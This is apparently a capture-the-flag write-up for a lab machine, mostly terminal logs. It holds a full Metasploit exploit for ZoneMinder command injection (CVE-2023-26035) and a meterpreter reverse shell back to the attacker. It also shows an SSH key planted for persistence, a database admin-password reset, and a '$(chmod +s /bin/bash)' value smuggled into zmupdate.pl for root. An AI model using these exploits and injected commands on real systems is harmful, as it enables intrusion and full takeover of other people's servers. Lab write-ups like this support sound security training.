└─$ ssh matthew@surveillance.htb
matthew@surveillance.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  9 08:52:31 PM UTC 2023

  System load:  0.11181640625     Processes:             231
  Usage of /:   86.8% of 5.91GB   Users logged in:       0
  Memory usage: 22%               IPv4 address for eth0: 10.129.230.42
  Swap usage:   0%

  => / is using 86.8% of 5.91GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
```

## user.txt

```c
matthew@surveillance:~$ cat user.txt 
d0f9da732ce4222a3795624bf5dab9d5
```

## Database Enumeration

```c
www-data@surveillance:/dev/shm$ mysql -u zmuser -p  
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 21765
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```c
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| zm                 |
+--------------------+
2 rows in set (0.001 sec)
```

```c
MariaDB [(none)]> use zm;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
MariaDB [zm]> update Users set Password=PASSWORD('newpass') where Username='admin';
Query OK, 1 row affected (0.002 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

ZoneMinder Version `version v1.36.32`.

## Privilege Escalation to zoneminder

> https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_lang_exec/

> https://sploitus.com/exploit?id=1337DAY-ID-39149&utm_source=rss&utm_medium=rss

> https://0day.today/exploit/39149

```c
┌──(user㉿kali)-[~]
└─$ ssh -L 8080:127.0.0.1:8080 matthew@surveillance.htb
matthew@surveillance.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  9 09:07:53 PM UTC 2023

  System load:  0.01220703125     Processes:             233
  Usage of /:   86.8% of 5.91GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.129.230.42
  Swap usage:   0%

  => / is using 86.8% of 5.91GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Dec  9 20:52:32 2023 from 10.10.16.13
matthew@surveillance:~$
```

> http://127.0.0.1:8080/

```c
┌──(user㉿kali)-[/media/…/htb/machines/surveillance/files]
└─$ cat zoneminder.rb 
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  prepend Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ZoneMinder Snapshots Command Injection',
        'Description' => %q{
          This module exploits an unauthenticated command injection
          in zoneminder that can be exploited by appending a command
          to the "create monitor ids[]"-action of the snapshot view.
          Affected versions: < 1.36.33, < 1.37.33
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'UnblvR',    # Discovery
          'whotwagner' # Metasploit Module
        ],
        'References' => [
          [ 'CVE', '2023-26035' ],
          [ 'URL', 'https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr']
        ],
        'Privileged' => false,
        'Platform' => ['linux', 'unix'],
        'Targets' => [
          [
            'nix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp',
                'FETCH_WRITABLE_DIR' => '/tmp'
              }
            }
          ],
          [
            'Linux (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
              'Type' => :linux_dropper
            }
          ],
        ],
        'CmdStagerFlavor' => [ 'bourne', 'curl', 'wget', 'printf', 'echo' ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-02-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
 
    register_options([
      OptString.new('TARGETURI', [true, 'The ZoneMinder path', '/zm/'])
    ])
  end
 
  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET'
    )
    return Exploit::CheckCode::Unknown('No response from the web service') if res.nil?
    return Exploit::CheckCode::Safe("Check TARGETURI - unexpected HTTP response code: #{res.code}") if res.code != 200
 
    unless res.body.include?('ZoneMinder')
      return Exploit::CheckCode::Safe('Target is not a ZoneMinder web server')
    end
 
    csrf_magic = get_csrf_magic(res)
    # This check executes a sleep-command and checks the response-time
    sleep_time = rand(5..10)
    data = "view=snapshot&action=create&monitor_ids[0][Id]=0;sleep #{sleep_time}"
    data += "&__csrf_magic=#{csrf_magic}" if csrf_magic
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'POST',
        'data' => data.to_s,
        'keep_cookies' => true
      )
    end
    return Exploit::CheckCode::Unknown('Could not connect to the web service') unless res
 
    print_status("Elapsed time: #{elapsed_time} seconds.")
    if sleep_time < elapsed_time
      return Exploit::CheckCode::Vulnerable
    end
 
    Exploit::CheckCode::Safe('Target is not vulnerable')
  end
 
  def execute_command(cmd, _opts = {})
    command = Rex::Text.uri_encode(cmd)
    print_status('Sending payload')
    data = "view=snapshot&action=create&monitor_ids[0][Id]=;#{command}"
    data += "&__csrf_magic=#{@csrf_magic}" if @csrf_magic
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'data' => data.to_s
    )
    print_good('Payload sent')
  end
 
  def exploit
    # get magic csrf-token
    print_status('Fetching CSRF Token')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET'
    )
 
    if res && res.code == 200
      # parse token
      @csrf_magic = get_csrf_magic(res)
      unless @csrf_magic =~ /^key:[a-f0-9]{40},\d+/
        fail_with(Failure::UnexpectedReply, 'Unable to parse token.')
      end
    else
      fail_with(Failure::UnexpectedReply, 'Unable to fetch token.')
    end
    print_good("Got Token: #{@csrf_magic}")
    # send payload
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
 
  private
 
  def get_csrf_magic(res)
    return if res.nil?
 
    res.get_html_document.at('//input[@name="__csrf_magic"]/@value')&.text
  end
end
 
#  0day.today [2023-12-09]  #
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/surveillance/files]
└─$ sudo cp zoneminder.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/
[sudo] password for user:
```

```c
-rw-r--r--  1 root root  4981 Dec  9 21:01 zoneminder.rb
```

```c
msf6 exploit(unix/webapp/zoneminder) > show options

Module options (exploit/unix/webapp/zoneminder):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /zm/             yes       The ZoneMinder path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      RaqHMiBISc       no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST                                yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   nix Command



View the full module info with the info, or info -d command.
```

```c
msf6 exploit(unix/webapp/zoneminder) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(unix/webapp/zoneminder) > set RPORT 8080
RPORT => 8080
msf6 exploit(unix/webapp/zoneminder) > set TARGETURI /
TARGETURI => /
msf6 exploit(unix/webapp/zoneminder) > set LHOST tun0
LHOST => 10.10.16.13
msf6 exploit(unix/webapp/zoneminder) > set ForceExploit true
ForceExploit => true
msf6 exploit(unix/webapp/zoneminder) > run

[*] Started reverse TCP handler on 10.10.16.13:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Elapsed time: 14.629507182999987 seconds.
[+] The target is vulnerable.
[*] Fetching CSRF Token
[+] Got Token: key:2b9d272dcc215bbbe7b58c6ed2ad6a0512e5308e,1702156185
[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3045380 bytes) to 10.129.230.42
[*] Meterpreter session 1 opened (10.10.16.13:4444 -> 10.129.230.42:41540) at 2023-12-09 21:10:19 +0000

[+] Payload sent

meterpreter >
```

## Privilege Escalation to root via CVE-2022-48522

> https://nvd.nist.gov/vuln/detail/CVE-2022-48522

```c
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

```c
sudo /usr/bin/zm[a-zA-Z]*.pl *
Deleted 10 log table entries by time
Deleted 10 log table entries by time
Deleted 10 log table entries by time
<--- SNIP --->
Deleted 10 log table entries by time
Deleted 10 log table entries by time
Deleted 10 log table entries by time
Deleted 1 log table entries by time
Deleted 0 log table entries by time
```

### Switching Shell

```c
ls -la
total 20
drwxr-x--- 2 zoneminder zoneminder 4096 Nov  9 12:46 .
drwxr-xr-x 4 root       root       4096 Oct 17 11:20 ..
lrwxrwxrwx 1 root       root          9 Nov  9 12:46 .bash_history -> /dev/null
-rw-r--r-- 1 zoneminder zoneminder  220 Oct 17 11:20 .bash_logout
-rw-r--r-- 1 zoneminder zoneminder 3771 Oct 17 11:20 .bashrc
-rw-r--r-- 1 zoneminder zoneminder  807 Oct 17 11:20 .profile
mkdir .ssh
cd .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==" > authorized_keys
```

```c
┌──(user㉿kali)-[~]
└─$ ssh zoneminder@surveillance.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  9 09:21:06 PM UTC 2023

  System load:  0.076171875       Processes:             236
  Usage of /:   85.0% of 5.91GB   Users logged in:       1
  Memory usage: 22%               IPv4 address for eth0: 10.129.230.42
  Swap usage:   0%

  => / is using 85.0% of 5.91GB
  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

zoneminder@surveillance:~$
```

```c
zoneminder@surveillance:~$ perl --version

This is perl 5, version 34, subversion 0 (v5.34.0) built for x86_64-linux-gnu-thread-multi
(with 60 registered patches, see perl -V for more detail)

Copyright 1987-2021, Larry Wall

Perl may be copied only under the terms of either the Artistic License or the
GNU General Public License, which may be found in the Perl 5 source kit.

Complete documentation for Perl, including FAQ lists, should be found on
this system using "man perl" or "perldoc perl".  If you have access to the
Internet, point your browser at http://www.perl.org/, the Perl Home Page.
```

```c
zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl --user='$(chmod +s /bin/bash)' --pass=ZoneMinderPassword2020

Database already at version 1.36.32, update skipped.
```

```c
zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl --version=2 --user='$(chmod +s /bin/bash)' --pass=ZoneMinderPassword2020

Initiating database upgrade to version 1.36.32 from version 2

WARNING - You have specified an upgrade from version 2 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-2.dump. This may take several minutes.
mysqldump: Got error: 1045: "Access denied for user '-pZoneMinderPassword2020'@'localhost' (using password: NO)" when trying to connect
Output: 
Command 'mysqldump -u$(chmod +s /bin/bash) -p'ZoneMinderPassword2020' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-2.dump' exited with status: 2
```

```c
zoneminder@surveillance:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

```c
zoneminder@surveillance:~$ /bin/bash -p
bash-5.1#
```

## root.txt

```c
bash-5.1# cat /root/root.txt
01209cefc5d07fbca3d14b75a0f06ceb
```
